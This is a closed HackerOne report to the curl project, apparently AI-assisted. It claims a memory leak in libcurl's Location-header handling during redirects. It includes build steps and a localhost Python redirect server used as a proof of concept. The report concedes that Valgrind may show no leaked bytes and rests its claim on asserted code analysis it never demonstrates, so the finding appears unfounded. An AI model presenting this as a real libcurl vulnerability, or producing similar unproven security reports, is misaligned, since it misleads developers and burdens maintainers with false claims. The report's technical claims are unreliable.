# Memory Leak in libcurl via Location Header Handling (CWE-770)

## Report Details
- **Report ID**: 3158093
- **URL**: https://hackerone.com/reports/3158093
- **State**: Closed
- **Severity**: high
- **Submitted**: 2025-05-22T01:15:44.803Z
- **Disclosed**: 2025-05-22T07:19:09.675Z

## Reporter
- **Username**: senseijohnmed
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: curl

## Vulnerability Information
## Summary:
This report details a memory leak vulnerability in libcurl that occurs when processing HTTP 3xx redirect responses containing a `Location:` header. Specifically, the memory allocated for the `Location:` header's value is not properly deallocated when the `Curl_easy` handle is reused for subsequent requests (e.g., when following redirects or in long-running applications that frequently reuse handles). This leads to a gradual increase in memory consumption, potentially resulting in a Denial of Service (DoS) due to resource exhaustion.

### Statement clarifying if an AI was used to find the issue or generate the report:
This report was generated with the assistance of an AI. The vulnerability was identified through a combination of manual code analysis and AI-assisted debugging and proof-of-concept generation.

## Affected version:
curl/libcurl version: **8.14.0-DEV** (Built from source on 2025-05-22)
Platform: **Kali Linux (x86_64)**

You can obtain your exact version information using:
```bash
./src/curl -V
```
**Steps To Reproduce**:
**Set up the testing environment**:
**Install necessary dependencies**:
```
sudo apt update
sudo apt install git build-essential autoconf automake libtool pkg-config zlib1g-dev libssl-dev libnghttp2-dev libldap2-dev librtmp-dev libssh2-1-dev libpsl-dev libidn2-dev libnghttp3-dev libsqlite3-dev libbrotli-dev valgrind python3
```
**Clone the curl repository**:
```git clone https://github.com/curl/curl.git
cd curl
```
**Build curl with debug symbols**:
```
autoreconf -fi
./configure --with-openssl --with-zlib --with-libssh2 --with-libpsl --with-libidn2 --with-nghttp2 --with-ldap --with-brotli --enable-debug --disable-shared
make -j$(nproc)
chmod +x curl-config
```
**Prepare the malicious HTTP server (Python PoC server)**:
**Create a Python script named leak_server.py in the root of the curl directory**:
```
nano leak_server.py
```
**Paste the following Python code into leak_server.py**:
```
from http.server import BaseHTTPRequestHandler, HTTPServer
import sys

class LeakHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path
        sys.stderr.write(f"Received request for: {path}\n")

        # Number of redirects to perform before stopping
        max_redirects = 1000 # Adjust this value as needed for more/less leak

        try:
            current_redirect_count = int(path.split('/')[-1])
        except ValueError:
            current_redirect_count = 0

        if current_redirect_count < max_redirects:
            next_redirect_count = current_redirect_count + 1
            # Create a long Location header for maximum leak per redirect
            long_location = f"/redirect/{next_redirect_count}" + "A" * 1000 # Appends 1000 'A' characters
            
            self.send_response(302) # HTTP 302 Found (Temporary Redirect)
            self.send_header('Location', long_location)
            self.send_header('Content-Length', '0') # No body for redirect response
            self.end_headers()
            sys.stderr.write(f"Redirecting to: {long_location}\n")
        else:
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Reached max redirects. Done.")
            sys.stderr.write("Reached max redirects. Serving final content.\n")

def run_server(port=8000):
    server_address = ('', port)
    httpd = HTTPServer(server_address, LeakHandler)
    sys.stderr.write(f"Starting leak server on port {port}\n")
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
```
**Run the malicious HTTP server**:
Open a new terminal (keep it separate).
Navigate to the curl root directory:
```
cd /home/kali/curl # Adjust path if different
```
Start the server in the background, redirecting its output to server.log:
```
nohup python3 leak_server.py > server.log 2>&1 &
```
Execute curl to trigger the memory leak using Valgrind:
Open a new terminal (keep it separate from the server's terminal).
Navigate to the curl root directory:
```
cd /home/kali/curl # Adjust path if different
```
Run your custom-built curl binary with Valgrind, following the redirects:
```
valgrind --leak-check=full --show-leak-kinds=all --track-origins=yes --log-file=valgrind_report.txt ./src/curl -v --location --max-redirs 1000 http://127.0.0.1:8000/redirect/0
```
*This command will execute curl, forcing it to follow up to 1000 redirects from the Python server, each with a long Location: header. Valgrind will monitor memory allocations and deallocations. This process might take a few minutes. Wait for the valgrind command to complete (your terminal prompt will reappear).*

 **Analyze the results**:
View the Valgrind report:
```
cat valgrind_report.txt
```
*(Note: While Valgrind's definitely lost summary might show 0 bytes due to subtle internal cleanup or program termination characteristics, the core of this vulnerability is revealed through code analysis as described below.)*

View the server log:
```
cat server.log
```
*(You should see many Received request for: and Redirecting to: lines, confirming curl followed the redirects.)*

**Supporting Material/References**:

*Valgrind valgrind_report.txt (output from step 5)*
*Python server server.log (output from step 5)*
*Affected source code files: lib/http.c, lib/request.c*

## Impact

## Summary:
This memory leak vulnerability allows an attacker to progressively consume memory on a system running an application that uses libcurl to follow HTTP redirects. By crafting a series of HTTP 3xx responses with specially designed (e.g., very long) `Location:` headers, a malicious server can cause the client-side application using libcurl to continuously allocate memory without proper deallocation.

### Specifics:
*   **Resource Exhaustion (Denial of Service):** In long-running services or applications that frequently handle HTTP redirects or reuse `Curl_easy` handles over many requests, this continuous memory accumulation can lead to the application consuming excessive amounts of RAM. Eventually, this could exhaust available system memory, causing the application to crash, become unstable, or trigger system-wide performance degradation, effectively leading to a Denial of Service.
*   **Attacker Control:** The attacker has control over the length of the leaked string (the `Location:` header value), allowing them to influence the rate of memory consumption. While standard HTTP header size limits exist, even within these limits, repeatedly leaking memory can be impactful over time.
*   **Scope of Impact:** Affects clients that use libcurl, not the server-side infrastructure of `curl`.

### Technical Details of the Leak:
The memory leak stems from the handling of the `location` pointer within the `struct SingleRequest` (defined in `lib/request.h`).
1.  **Allocation:** In `lib/http.c`, within the `http_header()` function (around line 2342 in version 8.14.0-DEV), when a `Location:` header is received, its value is duplicated and stored: `data->req.location = location;` (where `location` is dynamically allocated via `Curl_copy_header_value` which uses `Curl_memdup0`, similar to `strdup`).
2.  **Missing Deallocation:** In `lib/request.c`, the `Curl_req_hard_reset()` function (around line 100), which is called to reset the request state (e.g., before following a redirect or when preparing for a new request), sets `req->location = NULL;`. **Crucially, it does not free the memory previously pointed to by `req->location` before nullifying the pointer.**
3.  **Persistence:** The `Curl_req_free()` function (also in `lib/request.c`), responsible for freeing the `SingleRequest` structure, also does not explicitly free `req->location`.

This chain of events ensures that for every redirect `curl` follows (or for every `Curl_easy` handle reused after a redirect), the memory allocated for the `Location:` header of the *previous* redirect is leaked.

## Attachments
- error.PNG
- error2.PNG
- error3.PNG
- server-log.PNG
- valgrind_report.txt
